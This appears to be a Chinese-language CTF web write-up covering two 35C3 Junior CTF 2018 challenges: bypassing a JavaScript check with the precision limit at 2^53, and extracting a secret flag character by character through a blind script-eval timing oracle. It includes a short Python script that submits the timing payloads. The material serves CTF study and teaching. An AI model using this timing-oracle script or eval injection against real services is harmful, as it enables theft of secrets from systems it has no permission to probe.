# CTF Web - Script Runtime Validation and Timing Oracles

## 阅读定位

- 本卷处理 HTTP 服务把用户输入交给脚本运行时后，由语言数值语义、断言逻辑或执行时间产生的可观察差异。
- 这些案例不需要原生内存破坏；若已经获得 SQL、模板或反序列化注入点，应转向对应 Web 专题。

## Table of Contents

- [JavaScript MAX_SAFE_INTEGER Successor Equality (35C3 2018)](#javascript-max_safe_integer-successor-equality-35c3-2018)
- [Blind Script-Eval Exfiltration via Timeout (35C3 2018)](#blind-script-eval-exfiltration-via-timeout-35c3-2018)

---

## JavaScript MAX_SAFE_INTEGER Successor Equality (35C3 2018)

服务端 Wee/TypeScript 运行时包含一个数值断言：只有输入为有限值、不是 `NaN`，并且满足 `num === num + 1` 时才会返回 flag。JavaScript `Number` 使用 IEEE-754 双精度浮点数，超过最大安全整数后，相邻数学整数会落到同一个可表示值。

```javascript
const x = 9007199254740992; // 2^53
console.log(Number.isFinite(x)); // true
console.log(x === x + 1);        // true
```

**关键结论：** 当 JavaScript/TypeScript 校验假设“有限整数必然不等于它的后继”时，先测试 `2^53` 附近的精度边界。`Infinity` 和 `NaN` 往往会被单独过滤，真正有效的是有限但不安全的整数。

**参考：** 35C3 Junior CTF 2018 — Number Error, writeup 12828

---

## Blind Script-Eval Exfiltration via Timeout (35C3 2018)

服务把用户提交的 Wee 脚本与包含 flag 的 `DEV_NULL` 变量拼接后在服务端执行，但响应正文始终固定。解释器提供 `charAt` 和 `pause`，外层进程又有固定超时，因此条件分支是否进入暂停可以通过墙钟时间观察。

```text
if charAt(DEV_NULL, position) == candidate then
    pause(4500)
end
```

```python
import time
import requests

def test_candidate(position, candidate):
    code = (
        f"if charAt(DEV_NULL, {position}) == '{candidate}' then "
        "pause(4500) end"
    )
    started = time.perf_counter()
    requests.post(TARGET, json={"code": code}, timeout=8)
    return time.perf_counter() - started > 4.0
```

**关键结论：** 这不是 SQL 注入，而是 blind script-eval timing oracle。只要攻击者能让秘密相关分支产生稳定的长短执行时间，即使服务不返回输出，也能逐字符恢复秘密。自动化前应先测基线、抖动和超时阈值，并为临界样本重试。

**参考：** 35C3 Junior CTF 2018 — /dev/null, writeups 12830, 12871

